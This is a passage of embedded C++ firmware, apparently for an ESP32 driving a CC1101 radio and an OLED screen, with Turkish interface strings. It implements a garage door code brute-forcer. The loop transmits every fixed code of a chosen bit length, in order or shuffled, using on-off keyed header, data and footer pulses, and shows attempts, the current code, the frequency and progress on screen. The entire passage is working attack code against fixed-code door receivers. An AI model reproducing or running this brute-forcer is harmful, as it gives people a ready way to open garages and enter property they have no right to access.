    static constexpr uint16_t T_FOOT  = 9000; // µs footer

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);
    delayMicroseconds(200);

    uint32_t attempts = 0;
    uint32_t lastDraw = 0;
    uint16_t curCode  = 0;

    // Rastgele mod için shuffle dizisi
    static uint16_t shuffleBuf[4096];
    if (!sequential) {
        for (uint16_t i = 0; i < totalCodes; i++) shuffleBuf[i] = i;
        // Fisher-Yates shuffle
        for (uint16_t i = totalCodes - 1; i > 0; i--) {
            uint16_t j = (uint16_t)(esp_random() % (i + 1));
            uint16_t tmp = shuffleBuf[i]; shuffleBuf[i] = shuffleBuf[j]; shuffleBuf[j] = tmp;
        }
    }

    for (uint16_t idx = 0; idx < totalCodes; idx++) {
        if (readButtonLong()) {
            cc1101_strobe(CC1101_SIDLE);
            logPush("[GARAGE_BF] stopped at " + String(attempts));
            dispBannerWarn("Durduruldu: " + String(attempts));
            return;
        }

        uint16_t code = sequential ? idx : shuffleBuf[idx];
        curCode = code;

        // Header HIGH
        {
            uint8_t paOn[2] = {0x00, g_cc1101Power};
            cc1101_writeBurst(CC1101_PATABLE, paOn, 2);
            delayMicroseconds(T_HDR);
        }
        // Data bits (MSB first)
        for (int8_t b = (int8_t)codeBits - 1; b >= 0; b--) {
            uint8_t bit = (code >> b) & 1;
            uint8_t paOn[2]  = {0x00, g_cc1101Power};
            uint8_t paOff[2] = {0x00, 0x00};
            if (bit) {
                cc1101_writeBurst(CC1101_PATABLE, paOn, 2);
                delayMicroseconds(T_BIT);
            } else {
                cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
                delayMicroseconds(T_BIT);
            }
        }
        // Footer LOW
        {
            uint8_t paOff[2] = {0x00, 0x00};
            cc1101_writeBurst(CC1101_PATABLE, paOff, 2);
            delayMicroseconds(T_FOOT);
        }
        attempts++;
        delay(5); // kısa bekleme

        if (millis() - lastDraw > 300) {
            lastDraw = millis();
            uint8_t pct = (uint8_t)((uint32_t)attempts * 100 / totalCodes);
            dispClear(); dispStatusBar("Garaj Kapi BF");
            dispText(0, 12, "Deneme: " + String(attempts) + "/" + String(totalCodes));
            char binBuf[14];
            // Binary göster (max 12 bit)
            for (int8_t b = (int8_t)codeBits - 1; b >= 0; b--)
                binBuf[codeBits - 1 - b] = ((curCode >> b) & 1) ? '1' : '0';
            binBuf[codeBits] = 0;
            dispText(0, 22, "Kod: " + String(binBuf));
            dispText(0, 32, String(gFreqs[fs], 1) + "MHz " + String(codeBits) + "bit");
            // İlerleme çubuğu
            display.drawRect(2, 42, OLED_W - 4, 8, SSD1306_WHITE);
            display.fillRect(2, 42, map(pct, 0, 100, 0, OLED_W - 4), 8, SSD1306_WHITE);
            dispText(0, 54, String(pct) + "% [LONG] dur");
            dispCommit();
        }
    }

    cc1101_strobe(CC1101_SIDLE);
    {
        uint8_t paFinal[2] = {0x00, g_cc1101Power};
        cc1101_writeBurst(CC1101_PATABLE, paFinal, 2);
    }
    logPush("[GARAGE_BF] done=" + String(attempts)
            + " freq=" + String(gFreqs[fs], 1)
            + " bits=" + String(codeBits));
    dispBannerOK("Tamamlandi! " + String(attempts) + " deneme");
}

